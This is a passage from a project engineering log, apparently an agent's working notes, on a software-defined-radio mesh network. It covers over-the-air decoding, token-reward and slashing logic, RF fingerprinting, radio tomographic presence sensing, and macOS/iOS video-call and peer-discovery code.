smoke/DEPIN_TRIGGER_MESHBUDGET_2026-07-19.md).** ("все три"; trigger runs on HW, honest by design.)
- **Event-triggered decode (`otatrig <hex> <nbytes> <cp_thresh>`):** full-search the capture for the
  best preamble, decode ONLY if cp >= thresh (a good fade), else exit 3 "waiting". On HW: thresh 0.45
  fired at cp=0.516 (BER 20/32 -- 0.516 is NOT clean, threshold too low); thresh 0.85 -> 30 tries all
  "waiting", caught=0, ZERO garbage. Honest by construction: never fabricates a decode. Clean byte
  needs cp>=~0.85; this fading link peaks ~0.56, so it correctly waits. Mechanism proven, link is the
  limit. Don't lower the threshold to force a "catch" -- that just emits garbage.
- **Mesh capacity budget (`meshbudget`):** PROVEN 768 kbaud raw, 684 kbit/s net @64B, 3 FDD bands
  @2MHz -> 1.64 Mbit/s aggregate. PROJECTED (from measured ACLR -51 dB) 18 RRC bands @1MHz -> 9.85
  Mbit/s, 72 code+freq slots. Clearly labels proven-OTA vs projected. Use these numbers in the pitch.
- **RLNC-over-CDMA OTA harder than single link** (both sources need a good fade in the SAME capture);
  host-proven, OTA awaits stable bench. otatrig is the tool to catch the window.

**FADE PHYSICS + CLEAN OTA BYTE CAUGHT (2026-07-19,
smoke/DEPIN_FADEPHYSICS_CLEANBYTE_2026-07-19.md).** ("все три"; OTA gap CLOSED for single source.)
- **Fade profile (`fadeprofile <nbytes>`) on HW:** cyclic TX, one long capture, score cp per frame
  (local re-search per copy for clock drift). Measures the channel physics: **lag-1 autocorr 0.58-
  0.96 => SLOW fade** (antenna/thermal, NOT fast multipath) -> good moments are long RUNS of
  decodable frames. 3 runs: mean cp 0.18/0.98/0.71; **run2 = 98% frames decodable (126/129)**. Good
  windows exist and last. dt = flen/fs = 125us/frame.
- **CLEAN OTA BYTE CAUGHT:** acting on the physics, `otarxbest` (selection combining) over the
  recovered link (2.400 GHz, gain 71) -> **try1 copies=130 best_cp=1.000 BER=0/32 recv=deadbeef**.
  The multi-wave OTA gap is CLOSED for a single source. Chain: linkq guard -> sweep found gain 71 ->
  fadeprofile read the slow fade -> selection combining caught a cp~1.0 frame.
- **Whole-stack report artifact:** docs/report/tri-net-stack.html (new URL 1b5cd504) -- every claim
  tagged PROVEN-OTA / host / projection. Security, PHY, robustness, coding, capacity in one page.
- **DEPLOY GOTCHA:** a stale ARM binary silently makes a new mode print nothing (unknown arg ->
  usage to stderr, swallowed by 2>/dev/null). After adding a mode, VERIFY md5 on the board and that
  the mode exists (`<mode> < /dev/null`) before blaming the RF. The concurrent-ssh race (backgrounded
  TX ssh + foreground RX ssh) also intermittently eats output -- retry, or run RX in one ssh call.

**PHRASE + MULTI-SOURCE + RADIO->AI ALL OTA (2026-07-19,
smoke/DEPIN_MSG_MULTI_RADIOAI_OTA_2026-07-19.md).** ("все три"; three OTA milestones, all first-try.)
- **Whole PHRASE over the air:** "TRINET-OTA-LIVE!" (16 B) cyclic, `otarxbest ... 16` -> copies=64
  best_cp=1.000 **BER=0/128** recv=the exact phrase. Slow fade -> a 0.25 ms frame fits a good window.
- **MULTI-SOURCE message OTA:** .13@2.400 + .11@2.404 one generation at once, .10@2.402 wide-band
  channelizer (otarxrlnc2 mix +/-2 MHz) -> gens_decoded=1/1 first capture. Fade is at the RX front
  end (common to both paths) so a good window is good for BOTH sources -> catch it in a loop.
- **RADIO->AI on chip OTA (`rfclassify [label]`):** 3 RF features (cp, envelope flatness, subcarrier
  concentration) ternary-quantized {-1,0,+1} -> ternary-weight MAC (0 DSP) -> SIGNAL vs NOISE. OTA:
  TX-on 5/5 SIGNAL, TX-off 2/2 NOISE = 7/7. Sensing half of Proof-of-Coverage on the RX chip. (conc
  feature is weak -- DBPSK smears the tone; cp + flatness carry it.)
- **The pattern that unlocked all three:** slow fade + long good windows (fadeprofile) => a catch
  loop (capture -> best-copy / decode -> repeat until a good window lands) turns a marginal link into
  a working one. `otarxbest` (selection combining) and the good-window loop are the tools.

**FULL DePIN CYCLE OTA + MODULATION RECOGNITION + FORECAST (2026-07-19,
smoke/DEPIN_FULLCYCLE_MODCLASS_FORECAST_2026-07-19.md).** ("все три"; flagship economic loop closed.)
- **`depinota` = full DePIN cycle on the RX node, over the air:** selection-combining decode -> AI
  coverage verdict -> Proof-of-Relay receipt (`meter`) -> mint $TRI (`reward_units`) -- ONLY if
  covered AND BER=0. OTA good window: cp=1.000 BER=0/128 -> SIGNAL -> receipt -> **$TRI minted=1000**
  (reproduced). Noise -> minted=0 (no coverage/bad data -> no reward). Sensing->proof->token on chip.
- **Modulation recognition (`rfclassify` 3-class):** added CFO-ROBUST feature `dcoh = |mean(d)| /
  mean(|d|)`, d=x[k+OSF]conj(x[k]) -- tone's differential is a constant vector (dcoh~1), DBPSK flips
  (mid), noise ~0. Host 3/3 (DBPSK/TONE/NOISE); OTA our DBPSK recognised reliably. **HONEST LO-LEAK
  ARTIFACT:** TX-off at gain 71 classifies as TONE not NOISE -- the RX's own LO leakage is a coherent
  carrier (dcoh~0.99); tone-vs-noise OTA needs a power/RSSI gate. (`gentone <nsamp>` = pure subcarrier
  tone for testing; a fixed-bin DFT `conc` feature FAILS OTA because CFO shifts the tone off the bin.)
- **`cppredict`:** the slow fade is forecastable -- ternary persistence+trend predictor of next-frame
  decodability. Within a good window trivially 100%; the real forecastability metric is fadeprofile's
  lag-1 autocorr 0.58-0.96. A node can schedule TX into predicted good windows.

**DePIN ROUND OTA + COMMAND RECOGNITION + SCHEDULING (2026-07-19,
smoke/DEPIN_ROUND_CMDCLASS_SCHED_2026-07-19.md).** ("все три"; DePIN scales node->network OTA.)
- **`depinround <pool> <bytes:covered ...>` = full PoC round:** $TRI split across COVERED nodes by
  bytes (sum<=pool) + a ledger state-root. Driven by OTA: .10 sensed .13 AND .11 covered (caught each
  BER=0), settled 500 $TRI each, paid=1000<=pool, ledger_root=0x72058E11. Uncovered node -> 0 $TRI.
- **`cmdclass <recv_hex>` = error-tolerant control command:** ternary-correlate the received 16-B
  command vs codewords {GRANT,DENY,ALERT}, max score = action. OTA GRANT caught BER=0 -> GRANT
  (128/128); host 1-bit-error -> still GRANT (126/128). IEC-61499 event over radio.
- **rfclassify POWER GATE fixes the LO-leak confound:** mm=mean|x|; floor (400, arg[3]) gates TONE.
  OTA 3/3: DBPSK mm=2177, TONE mm=2291, truly-empty mm=174<400 -> NOISE. **GOTCHA:** leaving a TX LO
  powered (txpd=0) with no stream leaks an UNMODULATED CARRIER (mm~2064) -- correctly a TONE, not
  empty. For a true "no signal" test set txpd=1 on ALL boards first.
- **`schedgain <nbytes>`:** always-tx vs predicted-good-tx delivery from the cp series. Good window ->
  both 100%, 0 wasted. Gain shows in fade troughs; forecastability = the slow-fade autocorr.

**RF FINGERPRINT + SLASHING + DASHBOARD (2026-07-19,
smoke/DEPIN_FINGERPRINT_SLASH_DASHBOARD_2026-07-19.md).** ("все три"; fingerprint OTA fade-blocked.)
- **`rffinger [label]` = transmitter RF fingerprint via fine CFO.** Each AD9361 crystal has a unique
  offset; estimate it from the preamble: complex differential d=x[k+OSF]conj(x[k]) has phase
  2*pi*CFO/(fs/OSF); remove the known PN, average over 63 syms, arg -> CFO Hz. Host recovers injected
  +30k/-12k/+6k/+48k EXACTLY. **NEEDS a good fade window** (cp high) -- a trough gives garbage that
  WRAPS at +-384 kHz (half subcarrier). This session's OTA was a trough -> per-node CFO clustering
  deferred. (mixsum <hz> <file> = inject a known CFO for host testing.)
- **`depinslash <pool> <stake> <bytes:claimed:actual ...>` = honesty enforcement.** claimed&&actual
  -> reward; claimed&&!actual -> SLASHED (-stake). Host: 2 honest +500, liar -200. **COUPLING
  INSIGHT:** OTA slashing needs to attribute a decoded signal to a NODE -- a bare RX cannot (a
  kill/killall race counted a still-on .13 against .11). Attribution = the RF fingerprint, so opt 1
  and opt 2 are ONE mechanism.
- **Live dashboard** (docs/dashboard/tri-net-live.html, URL 6469fc1c): per-node coverage/cp/$TRI,
  slashed liar, aggregate, stack summary with proven-OTA/host/projection tags. Numbers trace to
  earlier OTA runs.
- **RF LINK NON-STATIONARY:** good windows come and go (session-to-session). If OTA is a trough,
  catch loops fail and CFO/decode are garbage -- don't force it, note it, the slow fade returns.

**RF FINGERPRINT MEASURED OTA + MULTI-HOP RELAY $TRI (2026-07-19,
smoke/DEPIN_FINGERPRINT_OTA_RELAY_2026-07-19.md).** ("все три"; fade recovered, fingerprint measured.)
- **RF fingerprint OTA:** link recovered (fadeprofile mean cp 0.998/1.000), so rffinger measured
  per-node CFO in good windows: **.11 = -55/-62/-53/-69 Hz -> tight ~-60 Hz (DISTINCT)**; .12 ~0
  (noisy); .13 ~+15 Hz. **HONEST:** these P201Minis have near-identical crystals (tens of Hz ~0.01
  ppm) -> CFO alone gives PARTIAL 3-way separation (.11 stands out, .12/.13 overlap). Robust 3-way ID
  needs a richer feature (I/Q imbalance, phase noise, transient). Gate on cp>=0.9 -- a trough garbles it.
- **`depinrelay <pool> <bytes> <hops_csv> [share%]` = multi-hop economics.** Path reward splits:
  origin earns for producing, each RELAY earns a carry-fee (share, divided among relays), dest is the
  settler. 2-hop .13,12,10 @30%: origin 700 / relay 300 / dest 0. 3-hop: 2 relays split 150 each. The
  2-hop DATA path was OTA-proven earlier (identical seal across hops); this adds the incentive to forward.
- **Live dashboard refreshed** (docs/dashboard/tri-net-live.html, URL 6469fc1c) with the real CFO
  fingerprints + a multi-hop economics panel.

**LIVE 2-HOP RELAY $TRI OTA + RICHER FINGERPRINT + RTI (2026-07-19,
smoke/DEPIN_RELAY_OTA_RTI_2026-07-19.md).** ("все три"; multi-hop cycle closed live.)
- **Live 2-hop relay OTA .13->.12->.10 + settle:** both hops decoded BER=0 in good windows, then
  depinrelay paid origin .13 700 $TRI / relay .12 300 $TRI (carry-fee) / dest .10 0, ledger committed.
  A node earns $TRI for CARRYING others' traffic -> the mesh grows bottom-up. (Store-and-forward:
  catch hop1 .13->.12, then .12 re-TXs, catch hop2 .12->.10.)
- **Richer fingerprint (rffinger + amp/gimb/dc), HONEST LIMIT:** amplitude, I/Q gain imbalance, DC
  leak are near-identical across nodes -- dominated by the COMMON RX (.10), add no TX discrimination.
  Only CFO is TX-specific (tens of Hz): .11(-44)/.13(+25) separable, .12(-65) overlaps .11. These
  P201Minis are RF-INDISTINGUISHABLE except partial CFO -> a spoofer with an identical board can't be
  caught by fingerprint alone; use the keyed MAC (crypto identity) for real attribution.
- **`rtisense <nbytes> [thresh]` = presence sensing seed:** per-frame envelope CV; steady link low CV
  (OTA 0.001-0.007 -> quiet, no false alarm), a moving body / fade raises it past thresh (0.15). One
  link = presence; N links = tomographic localization. Positive (real motion) demo needs bench access.

**CRYPTO ATTRIBUTION OTA (2026-07-19, smoke/DEPIN_CRYPTO_ATTRIB_2026-07-19.md).** ("все три".)
- **`depinattest <key_csv> <nframes>` = crypto attribution** -- the fix for RF-indistinguishable
  boards. Read coded frames; for each, try every node's key on the MAC; the verifying key attributes
  it to that node. Host: legit .13(A0A03333) -> tally=[0,0,6] node#2; spoofer(DEAD9999) -> [0,0,0]
  unattributed=6 NONE. **OTA: legit .13 -> tally=[0,0,30] attributed to node #2** (over the air). A
  spoofer with an identical board can't borrow the key -> trust the signature, not the signal.
- **3-hop relay OTA partial:** got 2 of 3 hops (.12->.11, .11->.10 BER=0; hop1 in a trough). 3-hop
  economics host-proven (2 relays split 150 each); the 2-hop full cycle was OTA-proven last wave.
  Non-stationary fade -> three good windows rarely align in one run.
- **Report v2** (docs/report/tri-net-stack.html): added crypto-attribution + OTA-relay + RTI cards.
- **Concurrent-ssh race is CHRONIC:** an inline backgrounded-TX + foreground-RX ssh intermittently
  eats the RX stdout. Use a SCRIPT FILE (like fadeprof.sh/finger2.sh/attest2.sh), or a function that
  keeps the RX loop in ONE ssh call, and retry.

**3-HOP RELAY + LINK-SLASH + RSS-RTI OTA (2026-07-19, smoke/DEPIN_RELAY3_RTI_2026-07-19.md).**
- **THE CYCLIC TX BUFFER MUST BE FILLED. `iio_writedev -c -b 46080` needs 46080 samples = SIX
  16-byte DBPSK frames** (one frame = (64+128)*40 = 7680 IQ samples). Feeding ONE frame (`otatx $P`)
  makes iio_writedev hit EOF before filling the cyclic buffer and DIE INSTANTLY -- nothing radiates,
  and the RX reads noise (best_cp ~0.05, BER ~50%) that looks exactly like a dead path. **This was
  the real cause of last wave's "hop1 blanked, 2/3 hops" -- NOT fade.** Always `otatx $P $P $P $P $P
  $P` (6 frames) OR set `-b 7680`. attest2.sh's `otatxcoded ... 6` (6 coded frames) was right by
  accident. **BROKEN RULER: before blaming an RX/path, check the TX writer is alive:**
  `ls /proc/[0-9]*/comm | xargs grep -l iio_writedev | wc -l` must be >=1. A dead transmitter reads
  as a dead receiver.
- **Full 3-hop `.13->.12->.11->.10` all BER=0/128, first try each** (retry-until-BER=0 with
  otarxbest selection combining, TDM one-TX-at-a-time). The "three windows must align" problem
  DISSOLVED once the writer bug was fixed -- each sequential hop waits for its own window; every
  pairwise link from .13 carries BER=0 when the TX actually transmits.
- **`depinslashlink <pool> <stake> <carry> <signed:delivered ...>`** ties link-slash to crypto
  attribution: signed+delivered -> +carry; signed+NOT-delivered -> SLASHED (the seal convicts, not
  just rewards); no-claim -> 0. Host/board-proven with A's real delivered-flags.
- **RTI over the air = RSS DROP, not envelope-CV.** The AD9361 RX tracking loops (DC/quadrature, ms)
  CANCEL slow TX amplitude modulation, so a modulation-CV surrogate dies over the air (flat 0.09 vs
  mod-90 0.14, erratic). The robust observable is **received power** (a body shadows the path ->
  RSS falls): clean monotone OTA curve `no-body ~1500 -> -15dB ~554 -> -25dB ~300 -> -35dB ~60`
  (~x3 per 10 dB shadow). New `rticp` mode = preamble-ALIGNED envelope (fixes rtisense's raw-block
  misalignment noise; host dose-response 0.00/0.30/0.58). **RX must be BELOW ADC saturation** for
  RSS to track (gain 71 clipped the strong end and masked small shadows; gain 45 gave the clean
  curve). Biological positive (real body) still bench-gated; surrogate = TX-side path attenuation.

**TWO-LINK RTI LOCALIZE + BLIND-RELAY + RTI ROC OTA (2026-07-19, smoke/DEPIN_LOCALIZE_BLINDRELAY_ROC_2026-07-19.md).**
- **TX HARDWAREGAIN SET BEFORE sleep->fdd IS RESET BY THE TRANSITION -- the attenuation silently
  never applies.** A "shadowed" link then reads the SAME (or higher) RSS as its baseline; only channel
  non-stationarity shows. **Set the TX gain on the LIVE DDS (after launch), and read it back**
  (`echo -35 > out_voltage0_hardwaregain; cat ...` -> `-35.000000`) to confirm. Proven single-TX
  sweep at RX gain 45: -5:1453 -15:502 -25:449 -35:38. Corollary: measure each link/level with ONE
  persistent TX and step the gain live -- a kill-and-restart-per-measurement resets the gain.
- **`rtilocalize <rssA> <rssB> <baseA> <baseB> [frac]` = two-link localization.** Shared RX .12, two
  anchors (.13=link A, .11=link B). Real OTA: A 1460->52 (x28), B 2610->209 (x12); classifies
  NONE / region A / region B / BOTH correctly. One link = presence, two links = WHERE.
- **`depinpath <carry> <stake> <att:del ...>` = blind-relay per-hop attribution.** Each hop's RECEIVER
  attests WHO sent (each sender signs with its own key); the path is reconstructed from per-hop
  attributions. OTA 3-hop: hop1->node#0, hop2->node#1, hop3->node#2, full_path_proven=true, paid=300,
  root=0xD3D8EAA6. Composition of attribution (wave 14) + 3-hop (wave 15).
- **`rtiroc <base_csv> <body_csv>` = RTI threshold calibration + ROC.** AUC = Mann-Whitney (not a
  naive pfa-trapezoid, which mis-scores tied thresholds). OTA: baseline mean=1298 sig=288, body
  159-763 -> AUC=0.984, auto(mean-3sig)=435 -> Pd=0.88 Pfa=0.00. Presence sensing gets a number.

**RTI TOMOGRAPHY + LOSS-RELAY + LIVE CALIBRATION OTA (2026-07-19, smoke/DEPIN_TOMOGRAPHY_LOSSRELAY_LIVECAL_2026-07-19.md).**
- **`rtiimage <dropA> <dropB> <dropC> <dropD> [lambda]` = 4-link RTI tomography** on a 3x3 grid
  (A=.13->.12 left col, B=.11->.12 right col, C=.13->.10 top row, D=.11->.10 bottom row). Solves
  x = W^T (WW^T + lambda I)^-1 y (dual 4x4). OTA drops A .96/B .91/C .55/D .89 -> shadow A+C -> cell
  #0, B+D -> #8, A+D -> #6 (all correct). Two links = a line, four = a point.
- **PER-LINK RX GAIN for multi-link RTI.** The two links into .10 differ by tens of dB (.13->.10 weak
  -> noise floor at gain 45/65; .11->.10 strong -> saturated). Each link is measured in its own TX
  session, so give each its own RX gain: .13->.10 gain 71, .11->.10 gain 48. Then all links track
  their -35 dB shadow. (One RX board can serve two links at different gains across TDM sessions.)
- **RLNC relay recovers through deep loss.** `otarxrlnc2` on a lossy hop: TX -5/-20/-32 dB all give
  gens_decoded=1/1, ascii exact -- the cyclic repetition supplies many noisy copies, a per-cv
  majority vote cleans them, and any 4 of 6 cv recover. A coded transit hop carries cargo through a
  fade the raw link could not; the erasure floor (<4 cv) is below -32 dB on this bench.
- **`rtitrack <stream> <labels> <alpha_pct> <frac_pct> <fixed_thr>` = live (EWMA) calibration.** A body
  attenuates RSS MULTIPLICATIVELY -> detector is present = rss < frac*baseline, baseline tracked by an
  EWMA on quiet samples. A mean-k*sigma sliding rule LAGS the drift and loses; the multiplicative EWMA
  is drift-robust. OTA (baseline drift 1400->590 + body dips): ADAPTIVE Pd=1.00 Pfa=0.08 vs FIXED
  Pd=1.00 Pfa=0.25.

**RTI HEATMAP TAB IN THE macOS APP (2026-07-19, smoke/RTI_HEATMAP_APP_2026-07-19.md).**
- **The TriNetMonitor RTI Heatmap tab is a REAL renderer** (`phone/desktop/RTIHeatmap.swift`):
  `RTIEngine` binds UDP :6000, draws a Bresenham line between two boards' grid positions per packet
  `[33,frm,to,0,val]` weighted by val/255, accumulates onto a 30x30 field decaying 0.9x/0.5s;
  crossing shadowed links light the cell. It just had NO data source and only 3 nodes.
- **4 boards at the corners** (.13 TL, .11 TR, .12 BL, .10 BR): .13<->.10 main diagonal, .11<->.12
  anti-diagonal cross at centre -> shadowing that pair lights the centre. Matches the 4-link
  tomography geometry.
- **Feed via scratchpad `rtifeed <host:port> <frm:to:drop ...>`** -> UDP packets. Fed the real OTA
  drops -> a clean X crossing at centre, verified on-screen (LIVE 544, Pkts:544).
- **Build the desktop app with real Xcode:** `DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer
  xcodebuild -project TriNetMonitor.xcodeproj -scheme TriNetMonitor -configuration Release` (CLT alone
  errors). `open -n .../TriNetMonitor.app`. **Only ONE process binds :6000** -- kill stray instances
  or the tab shows "bind fail"/Pkts:0.
- **Parallel agent active on this repo:** big uncommitted working tree (specs/*.t27, src/*.rs,
  phone/TriNetVideo/*.swift, docs/CROSS_AGENT_INTEGRATION.md untracked). Work SURGICALLY -- stage only
  your own files by explicit path, verify the staged count, never `git add -A`. A stale
  `.git/index.lock` once mass-staged 9639 files; `git reset HEAD` + remove the lock recovers.

**3D RTI TOMOGRAPHY IN THE APP (2026-07-19, docs/RTI_3D_DESIGN.md, phone/desktop/RTI3D.swift).**
- **3D RTI = ellipsoid backprojection into a voxel field.** For link (a,b), a voxel p gets weight
  `1/sqrt(|a-b|)` iff `|a-p|+|p-b|-|a-b| < lambda` (the 3D Fresnel ellipsoid). Real-time = backproject
  `x=Wᵀy`; sharper = regularized inverse `(WᵀW+C⁻¹)⁻¹Wᵀy` (precompute for fixed geometry). Motion =
  VRTI (per-link RSS variance, no baseline needed).
- **Z-axis is only observable if nodes have VERTICAL DIVERSITY** (>=2 heights) -- else all links are
  coplanar and height smears. The 4 boards are placed at two heights (.13/.10 high, .11/.12 low).
  4 corner nodes = coarse blob; ~12-20 nodes = sub-metre 3D in the literature.
- **Render with SceneKit** (`SCNView` via `NSViewRepresentable`, `allowsCameraControl=true`): voxels
  as small `SCNBox`, a Timer updates opacity + emission color per frame; `writesToDepthBuffer=false` +
  `.dualLayer` for the volumetric look; billboard `SCNText` node labels; wireframe `SCNBox`
  (`fillMode=.lines`) frame. RealityKit/Metal are overkill for ~1000 voxels. `RTIEngine` computes the
  voxel field from the same UDP link packets; `RTI3DView` renders it; a 3D/2D toggle in the RTI tab.
  Verified on-screen: two crossing diagonals -> beams crossing inside the cube.

## RTI RADAR — hard-won detector discipline (added 2026-07-20)

**The 3-node system is a DETECTOR, not an imager — this is geometry, not tuning.** Measurements =
links = N(N-1)/2, so 3 nodes = 3 links. RTI inversion `x̂=(WᵀW+C⁻¹σ²)⁻¹Wᵀy` needs #links ≈ #voxels;
`WᵀW` has rank ≤3 over hundreds of voxels → catastrophically ill-posed, the prior dominates the data.
Wilson-Patwari RTI used **28 nodes / 378 links**; VRTI "See-Through Walls" used **34 nodes** for ~1 m.
Never promise a tracked (x,y) on 3 nodes — ship presence/motion/zone-alarm, and SAY the wall out loud.
Refs: Wilson-Patwari TMC 2010 (RTI_version_3.pdf); VRTI arXiv:0909.5417.

**Detect on VARIANCE/|Δ|, NEVER on a signed drop.** By the fade-level model, a body entering a deep-fade
null can RAISE rss, not lower it — shadowing sign is unpredictable per (link,channel). The `drop` path
`(base-rss)/base` is theoretically unsound on fading links; prefer VRTI variance (pkt-35 window). Refs:
Kaltiokallio MASS 2012 (fade level); skew-Laplace TMC 2014; RSS non-monotonic arXiv:1804.03961; RADAR
INFOCOM 2000 abandoned RSS→distance for exactly this.

**The phantom-flood bug chain (RTIHeatmap.swift) — the 8 fixes, in order they mattered:**
1. **Absolute detection floor**, not relative `gmax*0.62` (which every frame's own peak clears → invents
   a target every frame). Floor is tied to the empty-room reference (CFAR principle, Rohling TAES 1983).
2. **MAD-robust sigma** `1.4826·median|x-med|`, NEVER std. Std has 0% breakdown — one 10-dB demod-corrupt
   frame inflates variance → false alarm; MAD has 50% breakdown. Rousseeuw-Croux JASA 1993. Calibration
   sigma AND runtime sd must BOTH be MAD or the CFAR scales diverge and the gate never fires.
3. **Coverage normalization**: divide each voxel by #link-ellipsoids through it (the diag of WᵀW) to kill
   the geometric crossing bias. `rebuildCoverage()` on any np3d change.
4. **Inverse-variance link weighting** `refSigma/sigma` (floor 0.12): a noisy link (sigma 313 vs 59)
   blankets its whole ellipsoid; down-weight it so clean links dominate.
5. **Gate ALL THREE motion feeds behind M-of-N (>=3 of 5), not just pkt-35.** THE key trap: pkt-35 (SNR),
   pkt-36 (CSI envelope) AND pkt-37 (CSI phase `phm`) all call `backproject3d(motion:true)`. I gated
   pkt-35, then found pkt-36 ungated, then pkt-37 ungated — each alone re-floods mvox. Grep for EVERY
   `backproject3d(... motion: true)` when a motion bug persists across fixes.
6. **Node liveness** (`liveNodes`/`nodeLastPkt`): node dots were hardcoded (drawn always) → a powered-off
   board never vanished → user read it as "fake data". A dot must grey/red when not heard <3 s.
7. **Data-real proof = power-down negative control.** User suspected synthetic data; measured the peer's
   log: the killed board's `src=N` lines dropped to 0 new instantly (synthetic would keep flowing). Same
   method as TX-off OTA control (89.6×→4.2×). NOTE: `.13` is radio-only (no Ethernet) so `.113` never
   answers SSH — that is NORMAL, not "offline".
8. **Background subtraction (per-voxel, Wilson-Patwari quiescent reference).** A SCALAR floor cannot fix
   the phantoms because the empty-room bias is PER-VOXEL. Two-phase calibration: phase-1 (5s) collects
   per-link quiet MAD sigma; phase-2 (4s, gate ACTIVE) records the per-voxel empty-room ceiling `voxBg[]`;
   detectPeaks uses `field = max(0, coverageNorm - voxBg)`. **voxFloor MUST be measured POST-gate** — an
   early version measured it during phase-1 (gate off) → saturated to 3.24 → blinded the radar. TODO next
   wave: ONLINE baseline update, frozen the instant any link trips, else a still person soaks into voxBg
   (Kaltiokallio "@grandma" LCN-W 2012).

**Two levers to beat the wall WITHOUT a 4th board:** (a) **channel diversity** — hop each link over K
2.4 GHz channels, keep a per-(link,channel) baseline; independent multipath → 3 links become 3×K virtual
(Kaltiokallio MASS 2012, ~10× accuracy). (b) **CSI dimensions** — extract AoA/ToF/Doppler per link as
"virtual anchors" (Widar2.0 MobiSys 2018, ~0.1 m from ONE link). Vitals need CSI phase-diff + multi-antenna
Rx (PhaseBeat ICDCS 2017, ~0.25 bpm); single RSS scalar cannot do breathing.

**Reports:** project report artifact bdff7ab8-...; RTI science Wave report f9c68613-...; both have a
print-to-PDF button (Chrome headless `--print-to-pdf` also renders the scratchpad HTML to a real .pdf).

## VIDEO CAPTURE — orientation / shake / quality (added 2026-07-20)

Sourced brief: AVFoundation/VideoToolbox, matched to FaceTime/WebRTC practice.

- **Front camera rotated 90 deg** = `AVCaptureVideoDataOutput` delivers SENSOR-NATIVE LANDSCAPE buffers;
  raw H.264 carries no orientation. Fix at CAPTURE: set `AVCaptureConnection.videoRotationAngle` (iOS17+;
  guard `isVideoRotationAngleSupported`). Do NOT hardcode 90 -- drive it from
  `AVCaptureDevice.RotationCoordinator.videoRotationAngleForHorizonLevelCapture` (gravity-aware, CORRECT
  per camera; front vs back differ) and KEEP THE COORDINATOR ALIVE (stored property). Front camera: send
  UN-mirrored to the wire (`automaticallyAdjustsVideoMirroring=false` FIRST, then `isVideoMirrored=false`)
  or the remote sees backwards text. macOS built-in cam is fixed-landscape -> leave angle 0, only mirror.
  Files use `AVAssetWriterInput.transform`; RTP/WebRTC signals rotation via the CVO header (rotate on
  render) -- signaling beats rotating pixels IF the receiver honors it; else rotate on encode.
- **Shaky video** -- split capture-shake from network-jitter. Capture: `.standard` video stabilization
  (`preferredVideoStabilizationMode`, guard `format.isVideoStabilizationModeSupported`; NOT `.cinematic`
  -- it adds latency) + LOCK FPS (`activeVideoMinFrameDuration == activeVideoMaxFrameDuration` inside
  `lockForConfiguration`). Network: jitter-buffer sizing + sender pacing; and AIMD bitrate swing causes
  visible "pumping" -- damp resolution/bitrate step changes. NOTE the heavy Network-tab scan (full /24
  sweep + SSDP + mDNS every 3s) starved the call -- gate heavy discovery to Scan Now / ~1/min.
- **Quality** -- `kVTProfileLevel_H264_Main_AutoLevel` (CABAC, ~10-15% better than Baseline; all Apple
  decoders OK) with `AllowFrameReordering=false` (no B-frames -> no latency); add `DataRateLimits` HARD
  cap `[bytes,1]` on top of `AverageBitRate` to clamp keyframe bursts that overflow UDP -> less
  macroblocking; set `RealTime=true` + `ExpectedFrameRate`. VGA talking-head saturates ~800 kbps -- scale
  RESOLUTION down before per-pixel quality. Refs: RFC 7742 (WebRTC=Constrained Baseline, 42e01f);
  Apple RotationCoordinator / videoRotationAngle / DataRateLimits docs.
- **iOS deploy caveat:** camera orientation is EMPIRICAL and the SIMULATOR HAS NO CAMERA -- a fix compiles
  (`xcodebuild -scheme TriNetVideo -destination 'generic/platform=iOS Simulator'`) but must be run on a
  real device and confirmed by eye. Headless deploy needs a paired device (`xcrun devicectl list devices`);
  if none, the user builds+runs from Xcode. The macOS `TriNetMonitor` IS deployable headlessly; iOS is not.

## iOS GROUP CALL (added 2026-07-20)

iOS was single-peer; the Mac already did group. Mirrored the Mac onto iOS `BSDTransport` + `StreamViewModel`
+ `Views`, ISOLATED from the working 1-1 path (own conference key, own per-source reassembly) so it can't
regress 1-1:
- **Crypto:** static conference key = `HKDF<SHA256>(SHA256("tri-net-psk-v1"), salt "trios-mesh/v1/conference",
  info "group-aead", 32)` -- EXACT same params as the Mac or the ends can't talk. Group seals with
  `ChaChaPoly.seal(_, using: confKey).combined`; no pairwise handshake.
- **Transport:** `connectGroup(hosts:port:recvPort:)` -> `peers:[sockaddr_in]`; `rawSend` fans out to all
  peers in group mode; rx loop uses **`recvfrom`** (not `recv`) for the SOURCE IP; per-`"src#seq"` fragment
  buffers so two phones' equal seqs never collide (the classic silent group bug); `onDataFrom(Data,String)`.
- **ViewModel:** `remoteIP` with >1 comma/space IP => group; `groupDecoders:[String:H264Decoder]` + `@Published
  roster`; per-source decode into its own tile; audio mixes; PLI handled.
- **UI:** `GroupGrid`/`GroupTile` -- each tile `@ObservedObject`s its own decoder so a frame redraws only that tile.
- **TEST (needs devices):** build TriNetVideo on each iPhone; in the call field enter the OTHER participants'
  IPs comma-separated (2 iPhones + Mac = a real 3-way; the Mac already groups). Cannot be verified headlessly.
- **Group polish (2026-07-20 "все три"):** (A) group FEC = per-`"src#seq"` parity recovery in
  `groupTryFEC` (mirror of the 1-1 XOR-parity, one lost fragment/NAL recovers, no keyframe); the sender
  already fans parity out via rawSend, the fix was the group RECEIVER honouring `0xFA 0xEC`. (B) damped
  AIMD: `nudgeBitrate` 0.92-down/+8k-up (was 0.9/+10k) AND update `DataRateLimits` on every step so the
  hard cap tracks the average (stops quality overshoot/pumping). (C) full-mesh uplink = peers x bitrate,
  so `camera.reduceForGroup(peers:)` splits the target `220k/peers` (floor 90k); grid columns adapt
  1/2/3 by roster size for 4-6 way.

## PEER DISCOVERY — pick people by name, not IPs (added 2026-07-20)

Replaced raw-IP entry with Bonjour presence. `desktop/TriNetVideo/PeerDiscovery.swift` (ObservableObject):
- **Advertise:** `NWListener(using: .udp)` as a PURE advertiser (our real UDP transport keeps :7000; do NOT
  run the transport through NWListener) + `NWListener.Service(name:type:"_trinet._udp",domain:"local.",
  txtRecord:)` carrying `name`/`uid`/`port=7000`.
- **Browse:** `NWBrowser(for: .bonjourWithTXTRecord(type:domain:))`; read `NWBrowser.Result.metadata` ->
  `.bonjour(txt)` for name/uid WITHOUT connecting; roster keyed on a stable per-install `uid` (persisted UUID).
- **Resolve (crux — Network.framework has NO standalone resolve):** open a throwaway `NWConnection` to the
  tapped `result.endpoint`, on `.ready` read `currentPath?.remoteEndpoint` -> `.hostPort(host,_)`, strip any
  `%zone`, cancel. IGNORE the resolved port, use 7000. Resolve ONLY the tapped peer, never the whole list.
- **Info.plist (MANDATORY or SILENT failure on iOS14+/macOS15+):** `NSLocalNetworkUsageDescription` +
  `NSBonjourServices:[_trinet._udp]`. In xcodegen use a target `info: properties:` block (arrays can't go
